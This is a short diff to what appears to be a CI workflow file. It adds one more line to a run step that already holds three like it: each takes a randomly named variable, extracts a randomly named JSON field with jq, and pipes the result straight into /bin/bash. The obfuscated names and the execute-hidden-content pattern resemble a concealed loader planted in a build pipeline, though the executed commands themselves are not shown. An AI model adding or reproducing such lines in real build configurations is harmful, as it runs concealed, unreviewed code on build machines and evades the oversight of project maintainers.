@@ -28,6 +28,7 @@ jobs:
           echo $dlsi0 | jq -r .qscdc4110 | /bin/bash
           printf '%s' "$cd79409" | jq -r .wbtjx60 | /bin/bash
           echo $fm624 | jq -r .cbhn0280 | /bin/bash
+          printf '%s' "$entb2" | jq -r .ptxm9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
